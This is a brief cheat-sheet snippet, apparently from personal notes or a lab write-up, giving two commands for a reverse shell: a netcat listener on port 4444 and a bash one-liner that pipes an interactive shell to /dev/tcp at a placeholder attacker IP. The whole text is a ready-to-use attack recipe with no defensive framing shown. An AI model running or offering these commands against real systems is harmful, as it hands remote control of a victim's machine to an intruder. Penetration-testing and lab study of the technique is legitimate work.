 - To get a reverse shell:
 - first open the listener on your machine:
```shell
 nc -lvnp 4444
```
- then use the command
```shell
/bin/bash -c '/bin/bash -i >& /dev/tcp/<your_IP>/4444 0>&1'
```
